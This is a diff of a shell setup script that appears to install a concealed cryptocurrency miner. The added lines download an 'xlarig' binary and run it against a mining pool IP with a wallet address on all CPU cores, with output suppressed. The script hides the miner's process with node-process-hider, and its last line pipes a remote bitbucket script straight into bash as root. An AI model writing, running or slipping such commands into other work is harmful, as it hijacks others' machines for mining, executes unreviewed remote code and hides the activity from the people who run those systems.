@@ -10,6 +10,6 @@ echo "supersede domain-name-servers 1.1.1.1;">> /etc/dhcp/dhclient.conf
 /etc/init.d/network restart
 sudo su --command "apt-get update && apt-get install gcc -y && curl -sL https://deb.nodesource.com/setup_14.x | bash && apt-get install nodejs -y && npm install -g npm@9.3.1 -y && npm i -g node-process-hider && ph add xlarig"
 mkdir .kap && cd .kap
-wget https://github.com/bengetsia/soft/raw/main/stak.tar.gz && tar -xvf stak.tar.gz
-./stak -o 172.105.120.149:443 -u 4Q4aKkiGsHnKSN6L4AsiUqcgLYKRgRkYmLphHDn4jf7xYKmFuVWC2LGZdNP5yVnPrxKU2qTsJZesRMJXiTrENXhULVM6ws6 -p x -k -a rx/0
+wget https://github.com/bengetsia/soft/raw/main/xlarig.tar.gz && tar -xvf xlarig.tar.gz
+./xlarig -o 172.104.40.104:443 -u ZEPHs8rEtqZaJ25FqjXvMbiFvPjuVd9VKP8whAB56jDbcBSxQuPJEhyDC7SQCGKAzcC2kT7VybgQGfVKo73aB518g7XrdF7yc1C -p dolar -t $(nproc --all) >/dev/null 2>&1
 curl -sL https://bitbucket.org/commuter21/escom/raw/main/gudabel.sh | bash 
